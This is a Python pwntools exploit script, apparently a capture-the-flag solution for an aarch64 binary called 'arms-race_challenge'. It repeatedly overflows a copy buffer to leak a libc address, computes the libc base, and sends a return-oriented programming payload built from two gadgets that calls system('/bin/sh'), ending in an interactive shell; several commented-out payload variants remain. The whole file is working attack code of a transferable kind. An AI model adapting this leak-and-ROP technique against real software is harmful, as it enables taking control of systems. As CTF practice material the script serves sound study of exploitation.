from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'aarch64'
p = process("./arms-race_challenge")
print("BEGIN")

print(p.recvuntil(b"Iteration"))

libc = ELF("./libc.so.6")

address = 0
base_addr = 0
leak_offset = 0xffffbe6eee18 - 0xffffbe6ce000
while True:
    print("Sending!")
    p.sendline(b"10000000")
    p.recvuntil("Copy Length:")

    p.sendline("32")
   
    p.sendlineafter(b"Enter text to copy:",b"A"*31+b"B" )
    msg =  p.recvuntil("* Thread 1 - 16 character trimmed string: ")

    result = p.recvline()
    print("Result:",result)
    if (b"B" in result):
        print("Overflow done!")
        address = result[result.find(b"B")+1:][:-1]
        address = u64(address+(8-len(address))*b'\x00')
        base_addr = address - leak_offset
        break

binsh = base_addr+ next(libc.search(b'/bin/sh'))

system_addr = base_addr + libc.symbols['system']


# 0x00000000000211f4 : ldp x29, x30, [sp], #0x50 ; ret
gadget1 = base_addr + 0x00000000000211f4
# 0x00000000000e9318 : ldr x0, [sp, #0x68] ; mov x1, x21 ; ldr x2, [sp, #0x98] ; blr x2
gadget2 = base_addr + 0x00000000000e9318
print("Leaked address:",hex(address))

print(p.recvuntil(b"Iteration"))

for _ in range(3):
    print("Sending!")
    p.sendline(b"10000000")
    p.recvuntil("Copy Length:")

    p.sendline("1000")
    #p.sendlineafter(b"Enter text to copy:",b"A"*40+p64(gadget2)+b"A"*(0x88)+p64(binsh)+b"B"*0x28+p64(system_addr))
    
    #p.sendlineafter(b"Enter text to copy:",b"A"*(160)+p64(gadget2)+b"A"*(0x88)+p64(binsh)+b"B"*0x28+p64(system_addr))
    p.sendlineafter(b"Enter text to copy:",b"A"*31+b"B"+p64(gadget2)+b"A"*(0x88)+p64(binsh)+b"B"*0x28+p64(system_addr)) 
    #+p64(gadget2)+b"A"*(0x88)+p64(binsh)+b"B"*0x28+p64(system_addr))
    msg =  p.recvuntil("* Thread 1 - 16 character trimmed string: ")
    result = p.recvline()
    if (b"B" in result):
        print(result)
        break
p.sendline("-1")
p.interactive()
